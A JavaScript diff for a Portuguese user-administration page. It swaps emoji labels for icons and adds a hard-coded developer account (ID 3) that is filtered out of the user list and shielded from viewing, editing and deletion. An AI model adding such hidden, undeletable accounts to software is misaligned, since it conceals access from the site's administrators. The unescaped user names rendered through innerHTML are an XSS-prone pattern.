@@ -2,6 +2,7 @@
 let usuarios = [];
 let modoEdicao = false;
 let usuarioIdParaExcluir = null;
+const DEV_USER_ID = 3; // ID do usuário desenvolvedor que deve ficar oculto
 
 // Seletores do DOM
 const userList = document.querySelector(".user-list");
@@ -80,7 +81,13 @@ async function carregarUsuarios() {
          throw new Error(`Erro HTTP: ${resposta.status}`);
       }
 
-      usuarios = await resposta.json();
+      const todosUsuarios = await resposta.json();
+
+      // Filtrar o usuário desenvolvedor (ID 3) da lista exibida
+      usuarios = todosUsuarios.filter(
+         (user) => parseInt(user.id) !== DEV_USER_ID
+      );
+
       renderUserCards();
    } catch (erro) {
       console.error("Erro ao carregar usuários:", erro);
@@ -103,6 +110,12 @@ function limparFormulario() {
 
 // Função para mostrar o formulário de edição ou criação
 function mostrarFormulario(modo, userData = null) {
+   // Proteção adicional: não permitir edição do usuário desenvolvedor
+   if (userData && parseInt(userData.id) === DEV_USER_ID) {
+      customModal.error("Este usuário não pode ser editado.");
+      return;
+   }
+
    modoEdicao = modo === "edicao";
 
    // Garantir que os valores de admin e ativo sejam números
@@ -207,7 +220,9 @@ function mostrarFormulario(modo, userData = null) {
                            ? "checked"
                            : ""
                      } />
-                  <label for="admin-nao-modal" class="radio-nao">❌ Não</label>
+                  <label for="admin-nao-modal" class="radio-nao">
+                     <i class="bi bi-person-fill" style="color: green;"></i> Usuário comum
+                  </label>
 
                   <input
                      type="radio"
@@ -219,7 +234,9 @@ function mostrarFormulario(modo, userData = null) {
                            ? "checked"
                            : ""
                      } />
-                  <label for="admin-sim-modal" class="radio-sim">✔️ Sim</label>
+                  <label for="admin-sim-modal" class="radio-sim">
+                     <i class="bi bi-person-fill-gear" style="color: blue;"></i> Admin
+                  </label>
                </div>
             </div>
 
@@ -237,7 +254,9 @@ function mostrarFormulario(modo, userData = null) {
                            ? "checked"
                            : ""
                      } />
-                  <label for="ativo-sim-modal" class="radio-sim">✅ Ativo</label>
+                  <label for="ativo-sim-modal" class="radio-sim">
+                     <i class="bi bi-person-check" style="color: green;"></i> Ativo
+                  </label>
 
                   <input
                      type="radio"
@@ -249,7 +268,9 @@ function mostrarFormulario(modo, userData = null) {
                            ? "checked"
                            : ""
                      } />
-                  <label for="ativo-nao-modal" class="radio-nao">❌ Inativo</label>
+                  <label for="ativo-nao-modal" class="radio-nao">
+                     <i class="bi bi-person-fill-slash" style="color: red;"></i> Inativo
+                  </label>
                </div>
             </div>
 
@@ -321,6 +342,12 @@ function mostrarFormulario(modo, userData = null) {
 // Função para exibir os detalhes do usuário
 async function exibirDetalhesUsuario(userId) {
    try {
+      // Proteção adicional: não exibir detalhes do usuário desenvolvedor
+      if (parseInt(userId) === DEV_USER_ID) {
+         customModal.error("Detalhes deste usuário não estão disponíveis.");
+         return;
+      }
+
       const resposta = await fetch(
          `api_usuarios.php?acao=obter_usuario&id=${userId}`
       );
@@ -379,6 +406,11 @@ async function criarUsuario(formData) {
 // Função para atualizar um usuário existente
 async function atualizarUsuario(formData) {
    try {
+      // Proteção adicional: bloquear qualquer tentativa de atualizar o usuário desenvolvedor
+      if (parseInt(formData.id) === DEV_USER_ID) {
+         throw new Error("Este usuário não pode ser modificado.");
+      }
+
       // Garantir que admin e ativo sejam números inteiros
       formData.admin = parseInt(formData.admin);
       formData.ativo = parseInt(formData.ativo);
@@ -441,6 +473,11 @@ async function atualizarUsuario(formData) {
 // Função para excluir um usuário
 async function excluirUsuario(userId) {
    try {
+      // Proteção adicional: impedir exclusão do usuário desenvolvedor
+      if (parseInt(userId) === DEV_USER_ID) {
+         throw new Error("Este usuário não pode ser excluído.");
+      }
+
       const resposta = await fetch(
          `api_usuarios.php?acao=excluir_usuario&id=${userId}`
       );
@@ -473,6 +510,12 @@ async function excluirUsuario(userId) {
 
 // Função para confirmar exclusão de usuário
 function confirmarExclusao(userId) {
+   // Proteção adicional: impedir confirmação de exclusão do usuário desenvolvedor
+   if (parseInt(userId) === DEV_USER_ID) {
+      customModal.error("Este usuário não pode ser excluído.");
+      return;
+   }
+
    customModal
       .confirm(
          "Tem certeza que deseja excluir este usuário?",
@@ -484,6 +527,32 @@ function confirmarExclusao(userId) {
             excluirUsuario(userId);
          }
       });
+}
+
+// Função para renderizar ícones com base no estado do usuário
+function getUserStatusIcons(user) {
+   let adminIcon = "";
+   let statusIcon = "";
+
+   // Ícone de administrador
+   if (user.admin == 1) {
+      adminIcon =
+         '<i class="bi bi-person-fill-gear" style="color: blue;" title="Administrador"></i>';
+   } else {
+      adminIcon =
+         '<i class="bi bi-person-fill" style="color: green;" title="Usuário comum"></i>';
+   }
+
+   // Ícone de status
+   if (user.ativo == 1) {
+      statusIcon =
+         '<i class="bi bi-person-check" style="color: green;" title="Ativo"></i>';
+   } else {
+      statusIcon =
+         '<i class="bi bi-person-fill-slash" style="color: red;" title="Inativo"></i>';
+   }
+
+   return { adminIcon, statusIcon };
 }
 
 // Função para criar e exibir os cards de usuários
@@ -507,17 +576,18 @@ function renderUserCards() {
          card.classList.add("user-inactive");
       }
 
+      // Obter ícones baseados no estado do usuário
+      const { adminIcon, statusIcon } = getUserStatusIcons(user);
+
       card.innerHTML = `
             <img src="../image/avatar.png" alt="avatar genérico" />
             <div class="user-info">
                 <p class="user-name">${user.nome}</p>
                 <p class="user-login">${user.usuario}</p>
-                <p class="user-admin">${
-                   user.admin == 1 ? "✔️ Admin" : "❌ Usuário comum"
-                }</p>
-                <p class="user-status">${
-                   user.ativo == 1 ? "✅ Ativo" : "❌ Inativo"
-                }</p>
+                <div class="user-status-icons">
+                    ${adminIcon}
+                    ${statusIcon}
+                </div>
             </div>
             <div class="user-actions">
                 <i class="bi bi-pencil-square user-edit" title="Editar"></i>
